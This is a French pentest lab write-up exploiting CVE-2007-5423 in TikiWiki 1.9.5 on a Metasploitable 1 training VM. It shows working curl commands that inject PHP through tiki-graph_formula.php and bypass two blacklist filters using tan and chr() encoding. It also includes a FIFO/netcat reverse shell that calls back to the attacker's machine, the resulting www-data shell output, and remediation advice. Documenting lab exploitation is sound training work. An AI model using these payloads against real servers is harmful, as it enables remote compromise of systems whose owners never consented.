TikiWiki 1.9.5 — RCE via tiki-graph_formula.php

Exécution de code à distance par injection PHP dans un paramètre de formule, avec contournement de deux filtres

Service / PortHTTP (Apache 2.2.8 / PHP 5.2.4) — port 80, appli /tikiwiki/
CibleMetasploitable 1 — 192.168.56.102
CVECVE-2007-5423
RésultatReverse shell interactif en tant que www-data
Testé parZANNOU Josaphat
Note réseau. Cette page utilise le réseau de Josaphat (vboxnet0) : cible 192.168.56.102, Kali 192.168.56.1. Côté Jules, le même service est sur 172.28.128.4 (réseau vboxnet1). Seules les IP changent. TikiWiki et TWiki coexistent sur le port 80 : ce sont deux applications distinctes, traitées chacune dans sa propre page.

1. Identification

Le scan sur le port 80 révèle un Apache 2.2.8 avec PHP 5.2.4. La racine du site n'a pas de titre : les applications sont rangées dans des sous-répertoires, qu'on énumère pour localiser TikiWiki et en obtenir la version exacte.

$ for p in tikiwiki tiki twiki; do curl -s -o /dev/null -w "/$p/ -> %{http_code}\n" "http://192.168.56.102/$p/"; done
/tikiwiki/ -> 302
/tiki/ -> 404
/twiki/ -> 200
$ curl -s -L http://192.168.56.102/tikiwiki/ | grep -ioE 'TikiWiki [0-9.]+'
TikiWiki 1.9.5

/tikiwiki/ existe (redirection vers tiki-index.php) et tourne en version 1.9.5.

2. Méthode d'identification de la CVE et du module

À partir de la version (TikiWiki 1.9.5), on vérifie l'existence d'une faille connue, du plus léger (searchsploit) à la référence précise (info du module) :

$ searchsploit tikiwiki graph
TikiWiki 1.9.8 - 'tiki-graph_formula.php' Com...  | php/webapps/4525.pl
TikiWiki tiki-graph_formula - PHP Remote Code...  | php/webapps/16911.rb

$ msfconsole -q -x "info exploit/unix/webapp/tikiwiki_graph_formula_exec; exit"
References:
  https://nvd.nist.gov/vuln/detail/CVE-2007-5423

La section References confirme CVE-2007-5423.

Mécanisme. tiki-graph_formula.php attend dans le paramètre tableau f[] une formule mathématique à tracer. Cette formule est évaluée côté serveur via create_function() (en substance return <formule>;). En concaténant un appel de fonction PHP dans la formule, on le fait exécuter — c'est une exécution de code à distance (RCE, pour Remote Code Execution). Deux garde-fous existent (un filtre sur les noms de fonctions et un filtre sur certains caractères) ; ils sont contournables, comme montré à la section 3.

3. Démarche d'exploitation

a) Confirmer l'exécution PHP. Test non destructif : si phpinfo() injecté dans f[] s'exécute, l'injection PHP est prouvée.

$ curl -s "http://192.168.56.102/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.tan.phpinfo()&t=png&title=cmd" | grep -ioE 'PHP Version [0-9.]+'
PHP Version 5.2.4

b) Passer à l'exécution de commandes — contourner deux filtres. Le premier filtre rejette system placé directement après x. (Invalid function call system), mais il ne contrôle que la fonction juste après x. : en intercalant une fonction maths autorisée (tan), system passe.

$ curl -s "...f[]=x.system('id')..."
Invalid function call system

$ curl -s -G "http://192.168.56.102/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&t=png&title=cmd" \
       --data-urlencode "f[]=x.tan.system('id')"
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Le second filtre rejette toute formule contenant un espace, un ;, un = ou un + (sortie vide). Pour une commande complexe (reverse shell), on construit donc la chaîne en chr() (uniquement chiffres, points et parenthèses — aucun caractère filtré) :

# reverse shell FIFO+nc (pas besoin de nc -e ni de /dev/tcp)
RS='rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.56.1 4444 >/tmp/f'
CHR=$(python3 -c "import sys;print('.'.join('chr(%d)'%ord(c) for c in sys.argv[1]))" "$RS")

# listener côté Kali, dans un autre terminal : nc -lvnp 4444
curl -s -G "http://192.168.56.102/tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&t=png&title=cmd" \
     --data-urlencode "f[]=x.tan.system($CHR)"

4. Preuve d'accès obtenu

Le reverse shell se connecte au listener nc et donne une session interactive. Les commandes s'exécutent sur la cible :

connect to [192.168.56.1] from (UNKNOWN) [192.168.56.102] 38909
bash: no job control in this shell
www-data@metasploitable:/var/www/tikiwiki$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@metasploitable:/var/www/tikiwiki$ uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
www-data@metasploitable:/var/www/tikiwiki$ hostname
metasploitable

Shell interactif confirmé en tant que www-data sur /var/www/tikiwiki. Ce n'est pas root : l'élévation de privilèges constituera une étape distincte.

5. Remédiation

RECOMMANDATIONS
  • Mettre à jour TikiWiki : la branche 1.9.x est obsolète (CVE-2007-5423 corrigée à partir de la 1.9.9).
  • Ne jamais évaluer une entrée utilisateur comme du code (create_function/eval). Un filtre par liste noire est contournable — démontré ici par trois techniques successives (placement de fonction, base64_decode, chr()) ; préférer une liste blanche stricte ou une bibliothèque de parsing mathématique sans exécution de code.
  • Désactiver les fonctions d'exécution dangereuses de PHP (system, exec, passthru, shell_exec) via disable_functions dans php.ini.
  • Appliquer le principe de moindre privilège au compte du serveur web (www-data) et isoler l'application pour limiter l'impact d'une RCE.
